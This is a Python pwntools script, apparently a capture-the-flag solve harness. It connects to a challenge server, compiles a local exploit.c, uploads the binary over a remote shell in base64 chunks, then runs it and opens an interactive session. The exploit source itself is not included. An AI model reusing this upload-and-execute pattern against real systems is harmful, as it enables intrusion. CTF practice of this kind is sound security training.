from pwn import *
import pwn
import os
import re
import random as rnd
import base64 as b64
import struct as st
from time import sleep

context.arch = "arm"
context.word_size = 32
context.timeout = 0.2

file = "./._start_vm"
# file = "./run"
args = []
io: process = None

speed = 0.1

def debug():
    run_in_new_terminal("./gdb.sh")
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="chal.competitivecyber.club", port=8886)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

# exe = ELF(file)
# libc = ELF("./libc.so.6")

SLICE_SIZE = 0x100

def exploit():
    sleep(3)
    with open("exploit", "rb") as f:
        code = b64.b64encode(f.read())
    code = [code[i:i+SLICE_SIZE] for i in range(0, len(code), SLICE_SIZE)]

    io.recvuntil(b"~\x1b[00m", timeout=0.6)
    for i in range(len(code)):
        print(i, "/", len(code))
        sla(b"$ ", f"echo -n '{code[i].decode()}' >> /home/ctf/exploit_tmp".encode("iso-8859-1"))

    sla(b"$ ", f"base64 -d /home/ctf/exploit_tmp > /home/ctf/exploit && \
    rm /home/ctf/exploit_tmp && \
    chmod +x /home/ctf/exploit \
    ".encode("iso-8859-1"))

    input("run")

    sla(b"$ ", b"/home/ctf/exploit")

    while True:
        leak = io.recv(timeout=0.5)
        # leak = re.sub(b"\x1b.+?m", b"", leak)
        leak = re.sub(b"\r", b"", leak)
        print(leak.decode("iso-8859-1"))
        io.sendline(input().encode())

    input("end")
    exit()

os.system("musl-gcc exploit.c -o exploit -static -s")
launch()

try:
    exploit()
except:
    while True:
        print(recv())
